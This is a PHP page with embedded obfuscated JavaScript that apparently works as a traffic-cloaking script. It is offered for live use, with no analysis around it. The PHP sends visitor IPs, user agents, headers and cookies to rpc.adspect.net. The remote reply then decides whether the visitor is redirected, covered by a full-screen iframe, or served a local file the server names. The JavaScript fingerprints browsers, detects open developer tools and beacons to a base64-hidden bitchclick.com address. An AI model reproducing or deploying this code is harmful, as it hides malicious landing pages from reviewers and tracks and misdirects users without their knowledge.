<?php
 error_reporting(0); ini_set('display_errors', 0); if (!function_exists('adspect')) { function adspect_coalesce($array, $keys, $default = '') { if (is_scalar($keys)) { $keys = array($keys); } foreach ($keys as $key) { if (array_key_exists($key, $array)) { return $array[$key]; } } return $default; } function adspect_render() { require_once func_get_arg(0); } function adspect($sid, $iframe) { $curl = curl_init(); $ipaddr = adspect_coalesce($_SERVER, array( 'HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR' )); $proto = adspect_coalesce($_SERVER, 'SERVER_PROTOCOL', 'HTTP/1.1'); $ua = adspect_coalesce($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_coalesce($_SERVER, 'HTTP_REFERER'); $query = adspect_coalesce($_SERVER, 'QUERY_STRING'); $cookie = sha1(implode(':', array($sid, $ipaddr, $ua, $query))); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $headers = array(); foreach ($_SERVER as $key => $value) { if (substr_compare('HTTP_', $key, 0, 5) == 0) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } $payload['cookie'] = array($cookie, adspect_coalesce($_COOKIE, $cookie)); $payload['headers'] = $headers; curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); if (1) { header('Access-Control-Allow-Origin: *'); } } $sid = adspect_coalesce($_GET, '__sid', $sid); curl_setopt($curl, CURLOPT_DNS_CACHE_TIMEOUT, 60); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_HTTPHEADER, array( 'Adspect-JS: ' . 1, 'Adspect-IP: ' . $ipaddr, 'Adspect-UA: ' . $ua, 'Adspect-Referrer: ' . $referrer )); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $target = curl_exec($curl); $status = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Content-Type: application/javascript'); header('Cache-Control: no-store'); switch ($status) { case 202: break; case 200: if (1) { if ($target != '') { if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo $target; } else { $target = json_encode($target); echo "window.__location = {$target};"; break; } } } elseif (!preg_match('/^[[:alnum:]]+:/i', $target)) { $target = parse_url($target); $query = adspect_coalesce($target, 'query'); parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; unset($_POST['data']); $_SERVER['REQUEST_METHOD'] = 'GET'; $dirname = dirname($target['path']); if ($dirname[0] !== '/') { $dirname = __DIR__ . '/' . $dirname; } chdir($dirname); adspect_render(basename($target['path'])); } elseif ($iframe) { $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; } else { header("Location: {$target}"); } die; case 404: header("{$proto} 404 Not Found", true, 404); die; default: header("{$proto} 503 Service Unavailable", true, 503); die; } setcookie($cookie, hash('crc32b', $cookie), time() + 60); return $target; } } $target = adspect('1eadd181-7178-6100-a845-ac1f6b95a853', 0); ?>
(function(k,d,n,g){function h(a){var b={},c;for(c in a)try{var f=a[c];switch(typeof f){case "object":if(null===f)break;case "function":f=f.toString()}b[c]=f}catch(r){}return b}function p(a){if(""!==a)switch(l){case "assign":case "replace":n[l](a);break;case "iframe":var b=d.createElement("iframe");b.style.cssText="width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;";b.src=a;d.body=d.createElement("body");d.body.appendChild(b)}}var q=d.getElementById(btoa(n.origin)),l=
q.className;if(k.a)return p(k.a);var m=function(){var a=q.getAttribute("src"),b=new FormData;b.append("data",JSON.stringify(e));if("beacon"===l&&g.sendBeacon)g.sendBeacon(a,b);else{var c=new XMLHttpRequest;c.open("POST",a,!1);c.onload=function(){200===this.status&&p(this.response)};c.send(b)}};(function(a,b){b.href=atob("aHR0cHM6Ly9iZWFjb24uYml0Y2hjbGljay5jb20vdjEvc3R5bGUuY3NzPw==")+(new Date).getTime();b.type="text/css";b.rel="stylesheet";a.appendChild(b)})(d.head||d.getElementsByTagName("head")[0],d.createElement("link"));var e=h({eval:eval});
e.window=h(k);e.document=h(d);e.documentElement=function(a){var b={};a=a.attributes;for(var c in a)c=a[c],b[c.nodeName]=c.nodeValue;return b}(d.documentElement);e.navigator=h(g);e.timezoneOffset=(new Date).getTimezoneOffset();(function(a,b){a.toString=function(){++b;return""};console.log(a);e.tostring=b})(function(){},0);try{throw Error();}catch(a){e.errorStack=a.stack}try{e.touchEvent=!!d.createEvent("TouchEvent")}catch(a){}try{g.permissions.query({name:"notifications"}).then(function(a){e.permissions=
[Notification.permission,a.state];m()},m)}catch(a){m()}})(window,document,location,navigator);
